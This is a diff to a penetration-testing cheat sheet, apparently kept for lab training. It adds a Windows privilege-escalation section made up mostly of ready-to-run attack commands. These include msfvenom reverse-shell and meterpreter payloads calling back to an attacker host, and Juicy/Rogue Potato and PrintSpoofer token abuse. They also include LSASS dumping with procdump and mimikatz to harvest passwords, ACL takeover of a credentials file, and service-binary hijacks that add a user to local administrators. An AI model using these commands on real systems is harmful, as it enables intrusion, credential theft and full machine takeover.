@@ -5,7 +5,7 @@
     - [Nmap](#nmap)
     - [Services](#services)
         - [FTP](#ftp-port-21)
-        - [SSh](#ssh-port-22)
+        - [SSH](#ssh-port-22)
         - [Http/ Https](#http-https-ports-80-443)
         - [SMB/ Samba](#smb-samba-ports-137-138-139-445)
         - [SMTP](#smtp-ports-25-587-465)
@@ -16,8 +16,8 @@
         - [Linux](#linux)
         - [Windows](#windows)
 - [Exploit](#exploit)
-        - [Linux](#linux-1)
-        - [Windows](#windows-1)
+        - [Linux](#linux-exploit)
+        - [Windows](#windows-exploit)
 - [Active Directory](#active-directory)
 
 ## Recon
@@ -356,11 +356,88 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 ```
 ## Exploit
 
-### Linux
+### Linux Exploit
 ```c
 ```
-### Windows
+### Windows Exploit
 ```c
+whoami /priv
+    SeImpersonatePrivilege - Enabled
+        Juicy Potato
+            #Option1
+            msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+            ./JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\shell-x64.exe -e cmd.exe" -t * -c "{CLSID}"
+            #Option2
+            MSF > m16_075_reflection_juicy > set options > set session
+        PrintSpoofer
+            #Option1
+                PrintSpoofer64.exe -i -c cmd
+            #Option2
+                printerspoofer.exe -c "C:\shell-x64.exe"  >  nc -lvnp PORT
+        RoguePotato
+            #Option1
+                On A: sudo socat tcp-listen, reuseaddr, ford tcp:B_IP:9999  >  nc -lvnp PORT
+                On B: Rougepotato.exe -r A_IP -e "C:\shell-x64.exe" -l 9999
+
+    SeDebugPrivilege - Enabled
+        Procdump
+            procdump.exe -accepteula -ma lsass.exe lsass.dmp
+            Load file into mimikatz  -  mimikatz.exe  >  log  >  sekurlsa::minidump filepath/lsass.dmp  >  sekurlsa::logonpasswords
+            Other option: Task manager  > Details  >  LSASS,  right click,  create dump,  save file to A and run mimikatz
+        RCE as SYSTEM<a href=https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1>psgetsys.ps1</a>
+            import-module psgetsys.ps1  >  [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
+            PID:  tasklist  -  looking for winlogon.exe PID  or  (Get-Process "lsass").Id
+            Command: "c:\Windows\System32\cmd.exe"
+
+    SeTakeOwnershipPrivilege - Disabled and SeChangeNotifyPrivilege - Enabled https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
+        Import-Module .\Enable-Privilege.ps1  >  .\EnableAllTokenPrivs.ps1  >  whoami /priv  -  TakeOwnership Enabled
+        Choose a file:  cmd /c dir /q 'C:\Department Shares\Private\IT'
+        Take ownership:  takeown /f 'C:\Department Shares\Private\IT\cred.txt'  >  Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
+        Modify ACL:  type file  - is denied  >  icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F  >  type file
+
+whoami /groups
+    Check joplin notes for exploit path
+    Backup Operators
+    Event Log Readers
+    DNSAdmins
+    Hyper-V Administrators
+    Printer Operator
+    Server Operators
+
+Registry
+    reg query HKLM\Software\Policies\Microsoft\Windows\Installer  -  AlwaysInstallElevated set to 1
+        On A: 
+            MSF  >  use multi/handler  >  set payload windows/meterpreter/reverse_tcp  >  set lhost A_IP  >  run
+            msfvenom -p windows/meterpreter/reverse_tcp lhost=A_IP -f msi -o setup.msi  >  transfer to B  python3 -m http.server
+        On B: 
+            Invoke-WebRequest http://A_IP:8000/setup.msi -OutFile setup.msi
+            Move file to C:\temp  >  PS: msiexec /quiet /qn /i C:\Temp\setup.msi  >  should have shell on MSF
+Service Escalation
+    Registry
+        On B PS:  Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl  -  user has “NT AUTHORITY\INTERACTIVE” “FullContol”
+        On A:
+            wget https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c  >  edit file and change system line to system("cmd.exe /k net localgroup administrators user /add")
+            x86_64-w64-mingw32-gcc windows_service.c -o x.exe  >  transfer to B  python3 -m http.server
+        On B:
+            Invoke-WebRequest http://A_IP:8000/x.exe -OutFile x.exe
+            Put file in C:/Temp  >  cmd:  reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+            sc start regsvc  >  check if user acc was added:  net localgroup administrators
+    Exe
+        On B: cmd: C:\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"  >  Everyone group has FILE_ALL_ACCESS for filepermservice.exe
+        On A:
+            wget https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c  >  edit file and change system line to system("cmd.exe /k net localgroup administrators user /add")
+            x86_64-w64-mingw32-gcc windows_service.c -o x.exe  >  transfer to B  python3 -m http.server
+        On B:
+            Invoke-WebRequest http://A_IP:8000/x.exe -OutFile x.exe
+            Option1
+            Put file in "C:\Program Files\File Permissions Service" > sc start filepermsvc  >  net localgroup administrators
+            Option2
+            Put file in C:/Temp  >  cmd:  copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"  >  sc start filepermsvc  >  net localgroup administrators
+
+    Startup Apps
+    DLL Hijack
+    binPath
+    Unquoted Service Path
 ```
 
 ## Active Directory
